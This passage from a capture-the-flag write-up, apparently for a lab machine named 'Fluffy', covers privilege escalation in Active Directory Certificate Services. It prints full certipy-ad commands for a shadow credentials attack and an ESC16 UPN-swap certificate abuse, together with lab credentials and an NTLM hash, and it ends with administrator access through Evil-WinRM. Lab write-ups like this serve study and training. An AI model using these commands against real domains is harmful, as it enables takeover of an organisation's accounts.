Overview

5. Escalation: ca_svc & ADCS ESC16

  • Used certipy-ad to perform shadow credentials attack on ca_svc: 
    faketime 'Mon Jun 23 00:54:02 2025' certipy-ad shadow auto -account ca_svc -target-ip 10.10.11.69 -u winrm_svc@fluffy.htb -hashes :33bd09dcd697600edf6b3a7af4875767
  • Found ESC16 vulnerability in ADCS (security extension disabled).
  • Changed UPN of ca_svc to administrator and requested a certificate: 
    certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' update -upn 'administrator'
faketime 'Mon Jun 23 22:01:00 2025' certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
  • Authenticated as administrator, extracted NTLM hash, and obtained root.txt via Evil-WinRM.
